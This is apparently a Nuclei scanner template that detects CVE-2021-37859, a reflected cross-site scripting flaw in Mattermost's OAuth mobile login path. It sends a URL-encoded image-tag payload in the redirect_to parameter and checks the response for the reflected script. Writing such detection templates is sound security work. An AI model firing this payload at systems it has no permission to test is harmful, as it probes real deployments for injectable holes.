id: CVE-2021-37859
info:
  author: 0x_Akoko
  description: reflected Cross-Site Scripting (XSS) via the OAuth flow
  name: Mattermost XSS
  severity: medium
  tags: cve,cve2021,xss
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <img src= onerror=alert(document.domain)>
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/oauth/shielder/mobile_login?redirect_to=%22%3E%3Cimg%20src%3D%22%22%20onerror%3D%22alert(document.domain)%22%3E'
